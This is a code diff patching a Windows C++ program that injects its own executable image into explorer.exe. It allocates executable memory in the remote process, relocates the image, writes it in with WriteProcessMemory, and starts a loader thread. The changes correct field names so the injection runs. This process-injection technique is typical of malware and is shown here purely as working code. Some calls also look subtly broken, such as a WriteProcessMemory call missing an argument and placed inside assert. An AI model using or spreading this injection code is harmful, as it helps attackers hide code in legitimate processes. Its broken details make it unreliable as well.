@@ -54,7 +54,7 @@ DWORD WINAPI load_image(LPVOID image_base) {
    DWORD import_rva = base_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
 
    if (import_rva != 0) {
-      PIMAGE_IMPORT_DESCRIPTOR import_table = (PIMAGE_IMPORT_DESCRIPTOR)&valloc_buffer[import_rva];
+      PIMAGE_IMPORT_DESCRIPTOR import_table = (PIMAGE_IMPORT_DESCRIPTOR)&base_u8[import_rva];
 
       while (import_table->OriginalFirstThunk != 0) {
          HMODULE module = LoadLibraryA((const char *)&base_u8[import_table->Name]);
@@ -144,16 +144,16 @@ int main(int argc, char *argv[]) {
       /* allocate space for our executable */
       std::uint8_t *self_u8 = (std::uint8_t *)GetModuleHandleA(nullptr);
       PIMAGE_NT_HEADERS64 self_nt = get_nt_headers(self_u8);
-      std::uintptr_t explorer_base = (std::uintptr_t)VirtualAllocEx(explorer_proc, nullptr, self_nt->OptionalHeader.ImageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+      std::uintptr_t explorer_base = (std::uintptr_t)VirtualAllocEx(explorer_proc, nullptr, self_nt->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
       assert(explorer_base != 0);
       
       /* copy the executable in memory and relocate it to the allocated base */
-      std::uint8_t *copy_u8 = (std::uint8_t *)std::malloc(self_nt->OptionalHeader.ImageSize);
-      std::memcpy(copy_u8, self_u8, self_nt->OptionalHeader.ImageSize);
+      std::uint8_t *copy_u8 = (std::uint8_t *)std::malloc(self_nt->OptionalHeader.SizeOfImage);
+      std::memcpy(copy_u8, self_u8, self_nt->OptionalHeader.SizeOfImage);
       relocate_image(copy_u8, (std::uintptr_t)self_u8, explorer_base);
       
       /* write the relocated executable to the process's allocation with WriteProcessMemory */
-      assert(WriteProcessMemory(explorer_proc, (LPVOID)explorer_base, copy_u8, self_nt->OptionalHeader.ImageSize));
+      assert(WriteProcessMemory(explorer_proc, (LPVOID)explorer_base, copy_u8, self_nt->OptionalHeader.SizeOfImage));
       
       /* get the rva of the loader and call it with CreateRemoteThread */
       DWORD loader_rva = VA_TO_RVA(self_u8, load_image);
